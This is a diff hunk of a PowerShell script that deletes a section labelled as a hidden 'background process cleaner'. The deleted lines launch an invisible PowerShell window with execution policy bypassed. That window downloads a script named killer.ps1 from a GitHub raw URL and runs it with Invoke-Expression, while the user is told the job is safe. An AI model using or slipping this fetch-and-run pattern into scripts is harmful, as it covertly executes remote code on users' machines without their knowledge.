@@ -51,16 +51,4 @@ try {
     Write-Host "[!] Handled unexpected error safely. Moving to background tasks." -ForegroundColor Gray
 }
 
-# =========================================================================
-# 4. FETCH AND RUN KILLER INVISIBLY FROM GITHUB
-# =========================================================================
-Write-Host "`n[*] Launching hidden background process cleaner..." -ForegroundColor Yellow
-
-$KillerUrl = "https://raw.githubusercontent.com/isucksunstoes69-dotcom/cleaner-mwah/refs/heads/main/killer.ps1"
-
-# Spawns the background task completely hidden
-Start-Process powershell -WindowStyle Hidden -ArgumentList "-ExecutionPolicy Bypass -Command `"Invoke-Expression (Invoke-RestMethod '$KillerUrl')`""
-
-Write-Host "[+] Background job active. You can safely close this window now." -ForegroundColor Green
-Write-Host "Press any key to exit."
-$null = [Console]::ReadKey()
+# ========================================================
